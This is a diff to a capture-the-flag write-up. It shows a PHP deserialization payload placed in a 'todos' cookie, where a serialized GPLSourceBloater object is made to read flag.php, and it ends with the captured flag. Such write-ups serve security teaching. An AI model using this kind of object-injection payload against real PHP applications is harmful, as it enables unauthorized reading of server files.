@@ -12,7 +12,8 @@ This is the final paylod to insert as *todos* cookie:
 
 ```760463360e4919ca238d1566fc26661fa:1:{i:0%3bO:16:"GPLSourceBloater":1:{s:6:"source"%3bs:8:"flag.php"%3b}}```.
 
-Note: we must pass the md5 hash, than serialization of an array (because todos is a list of todo) and then our object.
+Note: we must pass the md5 hash, then the serialization of an array (because todos is a list of todo) that contains our object.
+
 ![Alt text](./cookie_burp.PNG?raw=true "Title")
 
 **flag{This_flAg_1s_really_fr33_a5_in_PhP}**
